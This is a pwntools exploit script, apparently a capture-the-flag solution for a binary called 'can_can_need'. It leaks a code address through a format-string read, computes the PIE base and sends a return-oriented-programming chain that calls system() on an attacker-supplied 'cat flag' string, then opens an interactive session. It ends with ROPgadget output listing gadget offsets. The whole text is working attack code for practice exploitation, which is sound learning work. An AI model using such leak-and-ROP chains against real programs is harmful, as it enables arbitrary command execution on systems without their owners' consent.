from pwn import *
import time
context(log_level='debug',arch='amd64',os='linux',terminal=['tmux','splitw','-h'])


io=process("./can_can_need")
# io=remote("101.43.190.199",20000)
elf=ELF("./can_can_need")

io.recvuntil(b"gift?gift!\n")
io.sendline(b"cat flag")

io.recvuntil(b"]\n")
# io.send(b"%9$p") #canary

# gdb.attach(io)
# pause()

io.sendline(b"%12$p") #endbr4
io.recvuntil(b"!")
# canary=int(io.recv(18),16)
endbr4=int(io.recv(14),16)
# print("canary:  "+hex(canary))   #泄露canary
print("endbr4:  "+hex(endbr4))   #泄露endbr4
base_addr=endbr4-0x13e0
sh_addr=base_addr+0x200E
gift=base_addr+0x4040
pop_rdi_ret=base_addr+0x1443 
sys_addr=base_addr+elf.plt[b"system"]



io.recvuntil(b"]\n")
for i in range(9):
    io.sendline(b"+")
# payload=b"a"*14+b"+"*8+p64(0)
# io.sendline(payload)
io.sendline(str(pop_rdi_ret))
io.sendline(str(pop_rdi_ret>>32))
io.sendline(str(gift))
io.sendline(str(gift>>32))
io.sendline(str(sys_addr))
io.sendline(str(sys_addr>>32))
# io.sock.shutdown(1)
io.shutdown('write')
# io.shutdown_raw('write')
# io.send(payload)

# io.close()




io.interactive()


# Gadgets information
# ============================================================
# 0x000000000000143c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000000143e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000001440 : pop r14 ; pop r15 ; ret
# 0x0000000000001442 : pop r15 ; ret
# 0x000000000000143b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000000143f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x0000000000001213 : pop rbp ; ret
# 0x0000000000001443 : pop rdi ; ret
# 0x0000000000001441 : pop rsi ; pop r15 ; ret
# 0x000000000000143d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000000101a : ret
# 0x00000000000013c4 : ret 0x64be

# Unique gadgets found: 12
